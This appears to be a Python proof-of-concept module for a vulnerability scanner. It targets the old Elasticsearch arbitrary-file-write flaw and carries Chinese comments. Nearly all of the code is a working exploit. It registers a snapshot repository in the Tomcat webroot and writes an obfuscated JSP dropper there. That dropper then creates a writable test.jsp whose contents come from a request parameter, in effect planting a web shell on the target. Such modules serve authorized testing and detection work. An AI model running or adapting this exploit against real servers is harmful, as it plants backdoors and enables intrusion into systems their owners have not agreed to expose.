# coding:utf-8  
import requests
from lib.common import url_handle,get_random_ua
from lib.poc import POCBase

# ...
import urllib3
urllib3.disable_warnings()


class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        该漏洞并不适用于批量扫描，建议仅用作单个目标的概念验证，
        因为需要Elasticsearch、Tomcat的联动，而且tomcat的端口无法固定，纵使批量扫描想必成功率也是万分之一，  
        另外该洞的检测时间是常规漏洞的五倍  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Elasticsearch写任意文件漏洞（WooYun-2015-110216）",                        # 漏洞名称
        "VulnID" : "",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可

        "AppName" : "Elasticsearch",                     # 漏洞应用名称
        "AppVersion" : "1.5.x以前",                  # 漏洞应用版本
        "VulnDate" : "2015-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
        
        """,                                # 漏洞简要描述

        "fofa-dork":"",                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  

    }

    timeout = 10

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]

        host = self.host.replace("elastic://","http://")
        url0 = host + "/yz.jsp/yz.jsp/1" # url自己按需调整
        url1 = host + "/_snapshot/yz.jsp"
        url2 = host + "/_snapshot/yz.jsp/yz.jsp"
        url3 = host[:-4] + "8080" + "/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=ofxelasticsearchrcetest"
        url4 = host[:-4] + "8080" + "/wwwroot/test.jsp"

        data0 = "{\"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>\":\"test\"}"
        data1 = "{\"type\": \"fs\",\"settings\": {\"location\": \"/usr/local/tomcat/webapps/wwwroot/\",\"compress\": false}}"
        data2 = "{\"indices\": \"yz.jsp\",\"ignore_unavailable\": \"true\",\"include_global_state\": false}"

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
            """
            req0 = requests.post(url0,data = data0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            req1 = requests.put(url1,data = data1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            req2 = requests.put(url2,data = data2,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            req3 = requests.get(url3,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            req4 = requests.get(url4,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req4.status_code == 200 and "ofxelasticsearchrcetest" in req4.text:
                vuln = [True,req4.text]
            else:
                vuln = [False,req4.text]
        except Exception as e:
            raise e

        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()